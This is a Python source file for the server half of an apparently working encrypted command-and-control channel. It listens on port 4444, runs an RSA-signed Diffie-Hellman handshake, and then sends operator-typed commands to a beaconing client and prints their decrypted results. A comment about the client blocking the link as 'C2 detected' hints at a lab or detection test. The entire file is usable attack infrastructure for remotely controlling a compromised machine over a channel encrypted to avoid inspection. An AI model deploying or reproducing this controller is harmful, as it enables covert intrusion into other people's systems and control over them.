import socket
import base64

from cryptography.hazmat.primitives.asymmetric import padding, dh
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.fernet import Fernet

# ================= RSA PRIVATE KEY LOAD =================
with open("server_private.pem", "rb") as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None
    )

# ================= DH PARAMETERS =================
parameters = dh.generate_parameters(generator=2, key_size=2048)

HOST = "192.168.100.1"
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print("[+] Server listening...")

conn, addr = server.accept()
print(f"[+] Connected from {addr}")

# ================= HANDSHAKE =================
print("[*] Performing secure handshake...")

# Generate DH key pair
dh_private = parameters.generate_private_key()
dh_public = dh_private.public_key()

dh_public_bytes = dh_public.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Sign DH public key using RSA private key
signature = private_key.sign(
    dh_public_bytes,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)

# No RSA key is sent anymore

# Send DH public key
conn.send(len(dh_public_bytes).to_bytes(4, 'big'))
conn.send(dh_public_bytes)

# Send signature
conn.send(len(signature).to_bytes(4, 'big'))
conn.send(signature)

# Receive client DH public key
client_len = int.from_bytes(conn.recv(4), 'big')
client_bytes = conn.recv(client_len)

client_public = serialization.load_pem_public_key(client_bytes)

# Compute shared key
shared_key = dh_private.exchange(client_public)

# Derive AES key
derived_key = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=None,
    info=b'handshake data'
).derive(shared_key)

fernet_key = base64.urlsafe_b64encode(derived_key)
cipher = Fernet(fernet_key)

print("[+] Secure channel established!")

# ================= COMMUNICATION =================

while True:
    try:
        data = conn.recv(4096)

        if not data:
            print("[!] Client disconnected")
            break

        beacon = cipher.decrypt(data).decode()
        print("[BEACON]:", beacon)

        cmd = input("Enter command: ")
        conn.send(cipher.encrypt(cmd.encode()))

        if cmd.lower() == "exit":
            break

        result = conn.recv(4096)
        print("[RESULT]:\n", cipher.decrypt(result).decode())

    except Exception as e:
        if "Connection reset by peer" in str(e):
            print("[!] Client blocked connection (C2 detected)")
        else:
            print("Error:", e)
        break

conn.close()
